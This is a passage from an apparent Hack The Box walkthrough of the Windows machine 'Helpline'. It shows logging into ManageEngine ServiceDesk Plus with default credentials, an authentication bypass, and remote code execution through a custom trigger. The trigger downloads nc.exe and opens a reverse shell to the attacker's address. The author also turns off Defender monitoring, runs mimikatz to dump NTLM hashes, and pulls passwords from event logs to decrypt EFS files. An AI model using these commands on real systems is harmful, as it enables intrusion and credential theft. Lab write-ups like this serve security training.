SF:r\n\n\x20\x20\x20\x20<span class="nt">&lt;script</span><span class="err">\</span><span class="na">x20language=</span><span class="s">'JavaScript'</span><span class="err">\</span><span class="na">x20type=</span><span class="s">\"text/ja</span>
<span class="na">SF:vascript</span><span class="err">\"\</span><span class="na">x20src=</span><span class="s">'/scripts/Login\.js\?9309'</span><span class="nt">&gt;&lt;/script&gt;</span>\n\x20\x20\x20\x2
SF:0<span class="nt">&lt;script</span><span class="err">\</span><span class="na">x20language=</span><span class="s">'JavaScript'</span><span class="err">\</span><span class="na">x20type=</span><span class="s">\"text/javascript\"\x20src='/</span>
<span class="na">SF:scripts</span><span class="err">/</span><span class="na">jquery-1</span><span class="err">\.</span><span class="na">8</span><span class="err">\.</span><span class="na">3</span><span class="err">\.</span><span class="na">min</span><span class="err">\.</span><span class="na">js</span><span class="err">'</span><span class="nt">&gt;&lt;/script&gt;</span>\n\x20\x20\x20\x20\n\x20\x20\
SF:x20\x20<span class="nt">&lt;link</span><span class="err">\</span><span class="na">x20href=</span><span class="s">\"/style/loginstyle\.css\?9309\"\x20type=\"text/cs</span>
<span class="na">SF:s</span><span class="err">\"\</span><span class="na">x20rel=</span><span class="s">\"stylesheet\"/</span><span class="nt">&gt;</span>\n\x20\x20\x20\x20<span class="nt">&lt;link</span><span class="err">\</span><span class="na">x20href=</span><span class="s">\"/style/new</span>
<span class="na">SF:-classes</span><span class="err">\.</span><span class="na">css</span><span class="err">\?</span><span class="na">9309</span><span class="err">\"\</span><span class="na">x20type=</span><span class="s">\"text/css\"\x20rel=\"stylesheet\"</span><span class="nt">&gt;</span>\n\x20
SF:\x20\x20\x20<span class="nt">&lt;link</span><span class="err">\</span><span class="na">x20href=</span><span class="s">\"/style/new-classes-sdp\.css\?9309\"\x20type</span>
<span class="na">SF:=</span><span class="s">\"text/css\"\x20rel=\"stylesheet\"</span><span class="nt">&gt;</span>\n\x20\x20\x20\x20<span class="nt">&lt;link</span><span class="err">\</span><span class="na">x20href=</span><span class="s">\"/</span>
<span class="na">SF:style</span><span class="err">/</span><span class="na">conflict-fix</span><span class="err">\.</span><span class="na">css</span><span class="err">\?</span><span class="na">9309</span><span class="err">\"\</span><span class="na">x20type=</span><span class="s">\"text/css\"\x20rel=\"styleshee</span>
<span class="na">SF:t</span><span class="err">\"</span><span class="nt">&gt;</span>")%r(HTTPOptions,2328,"HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSE
SF:SSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9;\x20Path=/;\x20HttpOnly\r\nCac
SF:he-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:0
SF:0:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Acc
SF:ept-Encoding\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:45\x20GMT\r
SF:\nConnection:\x20close\r\nServer:\x20-\r\n\r\n<span class="nt">&lt;</span><span class="err">!</span><span class="na">DOCTYPE</span><span class="err">\</span><span class="na">x20html</span><span class="nt">&gt;</span>\n<span class="nt">&lt;html</span>
<span class="na">SF:</span><span class="nt">&gt;</span>\n<span class="nt">&lt;head&gt;</span>\n<span class="nt">&lt;meta</span><span class="err">\</span><span class="na">x20http-equiv=</span><span class="s">\"X-UA-Compatible\"\x20content=\"IE=Edge</span>
<span class="na">SF:</span><span class="err">\"</span><span class="nt">&gt;</span>\n\n\n\n\r\n\n\x20\x20\x20\x20<span class="nt">&lt;script</span><span class="err">\</span><span class="na">x20language=</span><span class="s">'JavaScript'</span><span class="err">\</span><span class="na">x20ty</span>
<span class="na">SF:pe=</span><span class="s">\"text/javascript\"\x20src='/scripts/Login\.js\?9309'</span><span class="nt">&gt;&lt;/script&gt;</span>\n\x2
SF:0\x20\x20\x20<span class="nt">&lt;script</span><span class="err">\</span><span class="na">x20language=</span><span class="s">'JavaScript'</span><span class="err">\</span><span class="na">x20type=</span><span class="s">\"text/javascript</span>
<span class="na">SF:</span><span class="err">\"\</span><span class="na">x20src=</span><span class="s">'/scripts/jquery-1\.8\.3\.min\.js'</span><span class="nt">&gt;&lt;/script&gt;</span>\n\x20\x20\x20\x2
SF:0\n\x20\x20\x20\x20<span class="nt">&lt;link</span><span class="err">\</span><span class="na">x20href=</span><span class="s">\"/style/loginstyle\.css\?9309\"\x20ty</span>
<span class="na">SF:pe=</span><span class="s">\"text/css\"\x20rel=\"stylesheet\"/</span><span class="nt">&gt;</span>\n\x20\x20\x20\x20<span class="nt">&lt;link</span><span class="err">\</span><span class="na">x20href=</span><span class="err">
</span><span class="s">SF:\"/style/new-classes\.css\?9309\"\x20type=\"text/css\"\x20rel=\"stylesh</span>
<span class="na">SF:eet</span><span class="err">\"</span><span class="nt">&gt;</span>\n\x20\x20\x20\x20<span class="nt">&lt;link</span><span class="err">\</span><span class="na">x20href=</span><span class="s">\"/style/new-classes-sdp\.css\?93</span>
<span class="na">SF:09</span><span class="err">\"\</span><span class="na">x20type=</span><span class="s">\"text/css\"\x20rel=\"stylesheet\"</span><span class="nt">&gt;</span>\n\x20\x20\x20\x20<span class="nt">&lt;link</span>
<span class="na">SF:</span><span class="err">\</span><span class="na">x20href=</span><span class="s">\"/style/conflict-fix\.css\?9309\"\x20type=\"text/css\"\x20rel</span>
<span class="na">SF:=</span><span class="s">\"stylesheet\"</span><span class="nt">&gt;</span>");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -59m59s, deviation: 0s, median: -59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-15 19:57:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 15 20:58:04 2019 -- 1 IP address (1 host up) scanned in 162.71 seconds

</code></pre></div></div>
<h4 id="we-got-http-on-port-8080-and-smb-i-tried-to-list-smb-shares-but-i-couldnt-authenticate-anonymously-">We got <code class="highlighter-rouge">http</code> on port 8080 and <code class="highlighter-rouge">smb</code>. I tried to list <code class="highlighter-rouge">smb</code> shares but I couldn’t authenticate anonymously :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/helpline# smbclient --list //helpline.htb/ -U ""
Enter WORKGROUP\'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
</code></pre></div></div>
<p><br /></p>
<hr />

<h3 id="http-initial-enumeration-administrative-access">HTTP Initial Enumeration, Administrative Access</h3>
<h4 id="on-the-http-port-there-was-an-application-called-manageengine-servicedesk-plus">On the <code class="highlighter-rouge">http</code> port there was an application called <code class="highlighter-rouge">ManageEngine ServiceDesk Plus</code>.</h4>
<p><img src="/images/hackthebox/helpline/1.png" alt="" /></p>
<h4 id="i-tried-some-common-credentials-like-adminadmin-and-guestguest-which-actually-worked-">I tried some common credentials like <code class="highlighter-rouge">admin:admin</code> and <code class="highlighter-rouge">guest:guest</code> which actually worked :</h4>
<p><img src="/images/hackthebox/helpline/2.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/3.png" alt="" /></p>
<h4 id="but-as-guest-my-capabilities-were-limited-so-i-had-to-elevate-to-an-administrative-user-i-searched-for-known-vulnerabilities-for-this-application-and-found-this-authentication-bypass-vulnerability-however-to-exploit-it-i-needed-a-valid-username-">But as <code class="highlighter-rouge">guest</code> my capabilities were limited so I had to elevate to an administrative user. I searched for known vulnerabilities for this application and found this <a href="https://www.exploit-db.com/exploits/42037">authentication bypass vulnerability</a>. However to exploit it I needed a valid username :</h4>
<p><img src="/images/hackthebox/helpline/4.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/5.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/6.png" alt="" /></p>
<h4 id="luckily-there-was-another-user-enumeration-vulnerability-which-i-could-exploit-as-guest">luckily there was another <a href="https://www.exploit-db.com/exploits/35891">user enumeration vulnerability</a> which I could exploit as <code class="highlighter-rouge">guest</code>.</h4>
<p><img src="/images/hackthebox/helpline/7.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/8.png" alt="" /></p>
<h4 id="before-using-wfuzz-with-a-long-wordlist-i-tried-some-common-usernames-first-administrator-was-an-existing-user-">Before using <code class="highlighter-rouge">wfuzz</code> with a long wordlist I tried some common usernames first, <code class="highlighter-rouge">administrator</code> was an existing user :</h4>
<p><img src="/images/hackthebox/helpline/9.png" alt="" /></p>
<h4 id="to-exploit-the-authentication-bypass-vulnerability-we-have-to-login-as-guest-then-navigate-to-mc-and-logout-after-that-we-will-login-as-administrator--by-using-administrator-as-username-and-password-then-return-to-the-index-page-again-and-we-will-be-redirected-to-the-dashboard-as-administrator">To exploit the authentication bypass vulnerability we have to login as <code class="highlighter-rouge">guest</code>, then navigate to <code class="highlighter-rouge">/mc</code> and logout. After that we will login as <code class="highlighter-rouge">administrator</code>  by using <code class="highlighter-rouge">administrator</code> as username and password then return to the index page again and we will be redirected to the dashboard as <code class="highlighter-rouge">administrator</code>.</h4>
<p><img src="/images/hackthebox/helpline/10.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/11.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/12.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/13.gif" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/14.png" alt="" /></p>
<h4 id="there-is-also-a-published-exploit-that-does-the-same-thing-automatically-">There is also a published <a href="https://www.exploit-db.com/exploits/46659">exploit</a> that does the same thing automatically :</h4>
<p><img src="/images/hackthebox/helpline/15.png" alt="" /></p>
<hr />

<h3 id="rce">RCE</h3>
<h4 id="i-checked-the-admin-section-and-custom-triggers-under-helpdesk-customizer-caught-my-attention">I checked the <code class="highlighter-rouge">Admin</code> section and <code class="highlighter-rouge">Custom Triggers</code> under <code class="highlighter-rouge">Helpdesk Customizer</code> caught my attention.</h4>
<p><img src="/images/hackthebox/helpline/16.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/17.png" alt="" /></p>
<h4 id="description-says--you-can-define-rules-to-automatically-invoke-any-custom-class-or-script-file-the-action-rules-can-be-applied-to-a-request-when-it-is-created-or-received-or-edited-or-both">Description says : “You can define rules to automatically invoke any custom class or script file. The action rules can be applied to a request when it is created, (or received) or edited or both”</h4>
<h4 id="i-ran-a-python-http-server-to-host-ncexe-then-i-created-a-trigger-that-executes-">I ran a python <code class="highlighter-rouge">http</code> server to host <code class="highlighter-rouge">nc.exe</code> then I created a trigger that executes :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -command Invoke-WebRequest http://10.10.xx.xx/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe
</code></pre></div></div>
<h4 id="when-a-request-is-created-it-must-has-the-word-test-in-the-subject">When a request is created (it must has the word <code class="highlighter-rouge">test</code> in the subject).</h4>
<p><img src="/images/hackthebox/helpline/18.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/19.png" alt="" /></p>
<h4 id="last-thing-to-do-is-to-create-a-request-that-runs-the-trigger-">Last thing to do is to create a request that runs the trigger :</h4>
<p><img src="/images/hackthebox/helpline/20.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/helpline/21.png" alt="" /></p>
<h4 id="i-edited-the-trigger-and-made-it-execute-">I edited the trigger and made it execute :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.xx.xx 1337
</code></pre></div></div>
<h4 id="then-i-created-another-request-and-got-a-reverse-shell-as-nt-authoritysystem-">Then I created another request and got a reverse shell as <code class="highlighter-rouge">nt authority\system</code> :</h4>
<p><img src="/images/hackthebox/helpline/22.png" alt="" /></p>
<hr />

<h3 id="encrypted-flags">Encrypted Flags</h3>
<h4 id="although-i-was-system-i-couldnt-read-the-flags-">Although I was <code class="highlighter-rouge">system</code> I couldn’t read the flags :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>E:\ManageEngine\ServiceDesk\integration\custom_scripts&gt;c:                         
c:              
C:\&gt;cd Users                  
cd Users 
C:\Users&gt;cd Administrator           
cd Administrator
C:\Users\Administrator&gt;cd Desktop                 
cd Desktop
C:\Users\Administrator\Desktop&gt;type root.txt                           
type root.txt
Access is denied.
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users&gt;cd tolu
cd tolu

C:\Users\tolu&gt;cd Desktop
cd Desktop

C:\Users\tolu\Desktop&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of C:\Users\tolu\Desktop

12/29/2018  10:21 PM    &lt;DIR&gt;          .
12/29/2018  10:21 PM    &lt;DIR&gt;          ..
12/21/2018  12:12 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   5,851,750,400 bytes free

C:\Users\tolu\Desktop&gt;type user.txt
type user.txt
Access is denied.
</code></pre></div></div>
<h4 id="thats-because-the-flags-are-efs-encrypted-">That’s because the flags are <code class="highlighter-rouge">EFS</code> encrypted :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;cipher /c root.txt
cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]
    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.


C:\Users\Administrator\Desktop&gt;cipher /c ../../tolu/Desktop/user.txt
cipher /c ../../tolu/Desktop/user.txt

 Listing C:\Users\tolu\Desktop\
 New files added to this directory will not be encrypted.

E user.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\tolu [tolu(tolu@HELPLINE)]
    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29 

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.


C:\Users\Administrator\Desktop&gt;
</code></pre></div></div>
<h4 id="to-decrypt-them-we-need-administrators-password-for-roottxt-and-tolus-password-for-usertxt-first-time-i-solved-this-box-i-got-the-root-flag-first-as-it-was-easier-but-for-the-write-up-ill-do-user-flag-first">To decrypt them we need <code class="highlighter-rouge">Administrator</code>’s password for <code class="highlighter-rouge">root.txt</code> and <code class="highlighter-rouge">tolu</code>’s password for <code class="highlighter-rouge">user.txt</code>. First time I solved this box I got the root flag first as it was easier but for the write-up I’ll do user flag first.</h4>
<p><br /></p>
<hr />

<h3 id="usertxt">user.txt</h3>
<h4 id="since-we-need-passwords-first-thing-i-did-was-to-put-mimikatz-on-the-box-and-dump-the-password-hashes">Since we need passwords, first thing I did was to put <a href="https://github.com/gentilkiwi/mimikatz"><code class="highlighter-rouge">mimikatz</code></a> on the box and dump the password hashes.</h4>
<h4 id="but-before-that-i-had-to-disable-">But before that I had to disable :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Administrator\Desktop&gt; Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $true
PS C:\Users\Administrator\Desktop&gt; 
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\windows\system32\spool\drivers\color&gt; Invoke-WebRequest http://10.10.xx.xx/mimikatz.exe -OutFile mimikatz.exe
Invoke-WebRequest http://10.10.xx.xx/mimikatz.exe -OutFile mimikatz.exe
PS C:\windows\system32\spool\drivers\color&gt; dir
dir


    Directory: C:\windows\system32\spool\drivers\color
    
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/15/2018   8:12 AM           1058 D50.camp
-a----        9/15/2018   8:12 AM           1079 D65.camp
-a----        9/15/2018   8:12 AM            797 Graphics.gmmp
-a----        9/15/2018   8:12 AM            838 MediaSim.gmmp
-a----        8/16/2019   1:24 PM        1006744 mimikatz.exe
-a----        8/16/2019   1:47 PM          38616 nc.exe
-a----        9/15/2018   8:12 AM            786 Photo.gmmp
-a----        9/15/2018   8:12 AM            822 Proofing.gmmp
-a----        9/15/2018   8:12 AM         218103 RSWOP.icm
-a----        9/15/2018   8:12 AM           3144 sRGB Color Space Profile.icm
-a----        9/15/2018   8:12 AM          17155 wscRGB.cdmp
-a----        9/15/2018   8:12 AM           1578 wsRGB.cdmp

PS C:\windows\system32\spool\drivers\color&gt; 
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz # lsadump::sam
Domain : HELPLINE
SysKey : f684313986dcdab719c2950661809893
Local SID : S-1-5-21-3107372852-1132949149-763516304

SAMKey : 9db624e549009762ee47528b9aa6ed34

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: d5312b245d641b3fae0d07493a022622

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 52a344a6229f7bfa074d3052023f0b41

RID  : 000003e8 (1000)
User : alice
  Hash NTLM: 998a9de69e883618e987080249d20253

RID  : 000003ef (1007)
User : zachary
  Hash NTLM: eef285f4c800bcd1ae1e84c371eeb282

RID  : 000003f1 (1009)
User : leo
  Hash NTLM: 60b05a66232e2eb067b973c889b615dd

RID  : 000003f2 (1010)
User : niels
  Hash NTLM: 35a9de42e66dcdd5d512a796d03aef50

RID  : 000003f3 (1011)
User : tolu
  Hash NTLM: 03e2ec7aa7e82e479be07ecd34f1603b
</code></pre></div></div>
<h4 id="the-only-crackable-hash-was-zacharys-">The only crackable hash was <code class="highlighter-rouge">zachary</code>’s :</h4>
<p><img src="/images/hackthebox/helpline/23.png" alt="" /></p>
<h4 id="but-what-can-we-do-with-zachary-">But what can we do with <code class="highlighter-rouge">zachary</code> ?</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\windows\system32\spool\drivers\color&gt; net users zachary
net users zachary
User name                    zachary
Full Name                    zachary
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/21/2018 10:25:34 PM
Password expires             Never
Password changeable          12/21/2018 10:25:34 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/16/2019 1:37:32 PM

Logon hours allowed          All

Local Group Memberships      *Event Log Readers    *Users
Global Group memberships     *None
The command completed successfully.
</code></pre></div></div>
<h4 id="zachary-is-a-member-of-a-local-group-called-event-log-readers-maybe-there-is-something-in-the-event-log-i-queried-the-event-log-with-wevtutil-and-saved-the-output-in-a-file-"><code class="highlighter-rouge">zachary</code> is a member of a local group called <code class="highlighter-rouge">Event Log Readers</code>, maybe there is something in the event log, I queried the event log with <code class="highlighter-rouge">wevtutil</code> and saved the output in a file :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\spool\drivers\color&gt;wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 &gt; eventlog.txt                                                                        
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 &gt; eventlog.txt

C:\Windows\System32\spool\drivers\color&gt;
</code></pre></div></div>
<h4 id="the-output-was-a-very-long-one-so-i-searched-for-interesting-stuff-like-usernames-by-searching--for-tolu-i-got-this-net-use-command-which-had-tolus-password-">The output was a very long one so I searched for interesting stuff like usernames, by searching  for <code class="highlighter-rouge">tolu</code> I got this <code class="highlighter-rouge">net use</code> command which had <code class="highlighter-rouge">tolu's</code> password :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\spool\drivers\color&gt;type eventlog.txt | findstr tolu                                                                   
type eventlog.txt | findstr tolu                                                                                                           
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                   
        Account Name:           tolu                                                                                   
        Account Name:           tolu                                                                                   
        Account Name:           tolu
    ----------------
     Removed Output
    ----------------
Process Command Line:   "C:\Windows\system32\systeminfo.exe" /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99                                                                                           
        Account Name:           tolu
Logon Account:  tolu
        Account Name:           tolu
        Process Command Line:   "C:\Windows\system32\net.exe" use T: \\helpline\helpdesk_stats /USER:tolu !zaq1234567890pl!99                                                                                     
        Account Name:           tolu
        Account Name:           tolu

</code></pre></div></div>
<h4 id="tolu--zaq1234567890pl99"><code class="highlighter-rouge">tolu : !zaq1234567890pl!99</code></h4>
<h4 id="tolu-is-in-the-remote-management-users-local-group-"><code class="highlighter-rouge">tolu</code> is in the <code class="highlighter-rouge">Remote Management Users</code> local group :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\spool\drivers\color&gt;net users tolu
net users tolu
User name                    tolu
Full Name                    tolu
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/28/2018 10:52:52 PM
Password expires             Never
Password changeable          12/28/2018 10:52:52 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/29/2018 10:20:44 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.
</code></pre></div></div>
<h4 id="and-winrms-port-is-open-">And <code class="highlighter-rouge">winrm</code>’s port is open :</h4>
<p><img src="/images/hackthebox/helpline/24.png" alt="" /></p>
<h4 id="so-i-thought-of-authenticating-as-tolu-to-read-the-flag-i-used-evilwinrm">So I thought of authenticating as <code class="highlighter-rouge">tolu</code> to read the flag (I used <a href="https://github.com/Hackplayers/evil-winrm"><code class="highlighter-rouge">evilwinrm</code></a>)</h4>
<p><img src="/images/hackthebox/helpline/25.png" alt="" /></p>
<h4 id="but-i-still-couldnt-read-the-flag-">But I still couldn’t read the flag …</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\tolu\Desktop&gt; type user.txt
Access to the path 'C:\Users\tolu\Desktop\user.txt' is denied.
At line:1 char:1
+ type user.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\tolu\Desktop\user.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
</code></pre></div></div>
<h4 id="i-found-this-guide-to-decrypt-efs-files-with-mimikatz-by-following-it-i-was-able-to-decrypt-the-user-flag">I found this <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">guide</a> to decrypt <code class="highlighter-rouge">EFS</code> files with <code class="highlighter-rouge">mimikatz</code>, by following it I was able to decrypt the user flag.</h4>
<h4 id="we-need-to-get-the-certificate-and-decrypt-the-masterprivate-keys-details-in-the-guide-mentioned-above-">We need to get the certificate and decrypt the master/private keys (details in the guide mentioned above) :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz # crypto::system /file:"C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29" /export                                                                               
* File: 'C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29'                                                                                      
[0045/1] BACKED_UP_PROP_ID                                                                     00                                                                                         [0002/1] KEY_PROV_INFO_PROP_ID                                                                 Provider info:                                                                                     Key Container  : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d                                       Provider       : Microsoft Enhanced Cryptographic Provider v1.0                             Provider type  : RSA_FULL (1)                                                               Type           : AT_KEYEXCHANGE (0x00000001)                                                 Flags          : 00000000                                                                   Param (todo)   : 00000000 / 00000000                                                 [0003/1] SHA1_HASH_PROP_ID
  91ef5d08d1f7c60aa0e4cee73e050639a6692f29
[0020/1] cert_file_element
  Data:
308202f9308201e1a0030201020210560e4d2b13840a9f4ef8246c32c1950f300d06092a864886f70d0101050500300f310d300b06035504031304746f6c753020170d3138313232393231323133335a180f32313138313230353231323133335a300f310d3
00b06035504031304746f6c7530820122300d06092a864886f70d01010105000382010f003082010a0282010100b661bbc3191aed3031d754ceee0cef50462a746656b973a74bed822fa31d44b8eb9ce1f165ef9f9691863b18694d0d72ddbb4ed40bc91021ef9ec7dc
977242dbab9d9124e548d7f71bfa191de5d0fd1d23de24a10958c5821adb7b89b350e5c3da17cdffdf828659dd8732f55bc7bd4f7e7c167f3f054520c34a4b280dbe0e86faae45082eeed8422549a49134b398351563c62dab70cfa3bb66d9cf07e749f3c2bc9a554a8
b2bcda9559d3f42b7b1fed755c519f26243756363efd93cae3f71aa813af0757d231a43daae5b3dc4303b330833e2db7cad6af45ab9c2b756c2de5af4f250df1c58e35bdfb3ccbc6c3be0db973faf27314413375d7b1c40dbc3310203010001a34f304d30150603551d
25040e300c060a2b0601040182370a030430290603551d1104223020a01e060a2b060104018237140203a0100c0e746f6c754048454c504c494e450030090603551d1304023000300d06092a864886f70d010105050003820101001054e49d105efb13f699ec26dd8f2
828eff46966b8b3623dafb132b287e4a4c870261bb6bec2acf8a8a648aead2b8c9daeb366d6096889ea23cba08d71b78aa9c09e92218c6bbd5b17e67910c551f0f452963d730f5b90c6be10048c1234087bcd1cdcc0f17adae55452f7f0b495414f54de59ff39f513e8
1aae5c1aa6e54beb8561aa5795cb59dddbfe528b9020d1f4d1aab1842eafbc0c0d92c75aa42ab1dd278262676a2fd5a39b526544d37cf59c2647db5efb743c78fb744be0cf41b2512c7f42dbb2949cbe359aca36b17670247b49b12c27119f7d358ca38e70c3ccebd13
c5bccc7236ae09646af07077233b49a5615cb8be05b642e09de595c89dfb9
  Saved to file: 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der


mimikatz # dpapi::capi /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85"

**KEY (capi)**

  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 00000025 - 37
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 0000011c - 284
  dwExPrivateKeyLen  : 00000650 - 1616
  dwHashLen          : 00000014 - 20
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 000000fc - 252
  pUniqueName        : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d
  pHash              : 0000000000000000000000000000000000000000
  pSiPublicKey       :
  pSiPrivateKey      :
  pSiExportFlag      :
  pExPublicKey       : 525341310801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef63637543
62f219c555d7feb1b7423f9d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e
51d19fa1bf7d748e524919dabdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b60000000000000000                                         
  pExPrivateKey      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002c - 44
    szDescription      : CryptoAPI Private Key
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : d05086dc4a0e8c37b26b9298d6e507a07e6b01495c8e874636d6555909860bfc
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : b7a581f4205455a35c32cf2bae9d3be3fd90990ae6f63c417e9c5a06084d04f1
    dwDataLen          : 00000550 - 1360
    pbData             : 0dd1b5843b4e6da999ab982ff7bef727bd63f11eb222fd81420d24e0dc8a8c03910ddca26dba324e943a5357776530618f14c74382062047acb3f35debdb8f885a283c3644542dde4aa1175ac9d7a23e014bb92d85c2f51dd8eb6d0007
a2f4ca83df25b59f32794c2a4e227e526cd2d5f4a222ca9c14be15e62982107d91865a3e0fc04708144aa7fe7f7baf0c5a7b99c18f96e82c1f01dc8b41df64b51befd3a978a9d47a72246ceadfda631d09be350a4d3bf1301fba7e1b6c6e0c40bf95ce9e154f79cbef2
6d7a3c00d538e490132954d4ee94619dcdaf75e64676c89e89317d4668fe4b942a7bc21371efa3adf08152dabdf0d16e608cda6bdcca193771d736e19505e51f6e972ef5da070b0023e740dd96893d0458da1994f72aa3bc6846218e4634d4a199f698dcce5d2a96c68
